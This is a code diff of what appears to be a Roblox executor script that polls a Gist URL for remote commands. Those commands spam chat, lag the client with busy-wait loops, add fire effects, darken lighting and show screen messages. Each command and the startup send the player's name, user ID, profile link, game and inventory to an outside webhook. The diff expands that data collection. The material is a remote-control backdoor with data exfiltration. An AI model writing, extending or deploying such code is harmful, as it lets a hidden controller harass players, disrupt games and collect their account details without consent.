@@ -24,20 +24,23 @@ local function getInventory()
 	return #items > 0 and table.concat(items, ", ") or "Empty"
 end
 
-local function sendWebhook(title, desc, color)
+local function sendWebhook(title, desc, color, extraField)
 	local pInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+	local fields = {
+		{["name"] = "👤 Player", ["value"] = string.format("[%s](https://www.roblox.com/users/%d/profile)", LocalPlayer.Name, LocalPlayer.UserId), ["inline"] = true},
+		{["name"] = "🎮 Game", ["value"] = string.format("[%s](https://www.roblox.com/games/%d/)", pInfo.Name, game.PlaceId), ["inline"] = true},
+		{["name"] = "🎒 Inventory", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
+	}
+	if extraField then table.insert(fields, extraField) end
+
 	local data = {
 		["embeds"] = {{
 			["title"] = title,
 			["description"] = desc,
 			["color"] = color,
-			["fields"] = {
-				{["name"] = "👤 Player", ["value"] = LocalPlayer.Name, ["inline"] = true},
-				{["name"] = "🎮 Game", ["value"] = pInfo.Name, ["inline"] = true},
-				{["name"] = "🎒 Inventory", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
-			},
+			["fields"] = fields,
 			["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"},
-			["footer"] = {["text"] = os.date("%X")}
+			["footer"] = {["text"] = "Gist-Control • " .. os.date("%X")}
 		}}
 	}
 	pcall(function()
@@ -53,11 +56,8 @@ end
 local function showScreenMessage(txt)
 	local sg = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
 	local l = Instance.new("TextLabel", sg)
-	l.Size = UDim2.new(1, 0, 1, 0)
-	l.BackgroundTransparency = 1
-	l.TextColor3 = Color3.new(1, 0, 0)
-	l.TextScaled = true
-	l.Font = Enum.Font.FredokaOne
+	l.Size, l.Position = UDim2.new(1, 0, 1, 0), UDim2.new(0,0,0,0)
+	l.BackgroundTransparency, l.TextColor3, l.TextScaled, l.Font = 1, Color3.new(1, 0, 0), true, Enum.Font.FredokaOne
 	l.Text = txt
 	task.delay(5, function() sg:Destroy() end)
 end
@@ -82,31 +82,27 @@ local function execute(text)
 	elseif cmd == "message" then 
 		showScreenMessage(val)
 	elseif cmd == "fire" and char then 
-		local f = Instance.new("Fire", char:FindFirstChild("HumanoidRootPart"))
-		f.Name = "GistFire"
-		f.Size = 10
+		local hrp = char:FindFirstChild("HumanoidRootPart")
+		if hrp then local f = Instance.new("Fire", hrp) f.Name = "GistFire" f.Size = 15 end
 	elseif cmd == "unfire" and char then 
-		local f = char:FindFirstChild("HumanoidRootPart"):FindFirstChild("GistFire")
-		if f then f:Destroy() end
+		local hrp = char:FindFirstChild("HumanoidRootPart")
+		if hrp and hrp:FindFirstChild("GistFire") then hrp.GistFire:Destroy() end
 	elseif cmd == "darktime" then 
-		Lighting.Brightness = 0
-		Lighting.ClockTime = 0
+		Lighting.Brightness = 0 Lighting.ClockTime = 0
 		task.delay(5, function() Lighting.Brightness = 2 Lighting.ClockTime = 14 end)
 	elseif cmd == "lag" then 
 		loops.lag = RunService.Heartbeat:Connect(function()
-			local t = tick()
-			while tick() - t < 0.1 do end
+			local t = tick() while tick() - t < 0.15 do end
 		end)
 	elseif cmd == "unlag" then 
 		if loops.lag then loops.lag:Disconnect() loops.lag = nil end
 	elseif cmd == "chat_spam" then
 		loops.spam = true
+		sendWebhook("💬 Spam Started", "Spamming in progress...", 0xFFFF00, {["name"] = "📝 Message", ["value"] = "```" .. val .. "```"})
 		task.spawn(function()
 			while loops.spam do
-				local event = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-				if event then
-					event.SayMessageRequest:FireServer(val, "All")
-				end
+				local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+				if chatEvent then chatEvent.SayMessageRequest:FireServer(val, "All") end
 				task.wait(0.5)
 			end
 		end)
@@ -114,11 +110,13 @@ local function execute(text)
 		loops.spam = false
 	end
 
-	sendWebhook("⚡ Command Executed", "**Status:** `" .. text .. "`", 0xFF0044)
+	if cmd ~= "chat_spam" then
+		sendWebhook("⚡ Command Executed", "**Result:** `" .. text .. "`", 0xFF0044)
+	end
 end
 
 task.spawn(function()
-	sendWebhook("🚀 System Online", "**User:** " .. LocalPlayer.Name .. " has connected.", 0x00AABB)
+	sendWebhook("🚀 System Online", "Connected and monitoring Gist.", 0x00BFFF)
 	
 	local start = request({Url = GIST_URL .. "?t=" .. tick(), Method = "GET"})
 	if start.Success then lastCommand = start.Body:gsub("^%s*(.-)%s*$", "%1") end
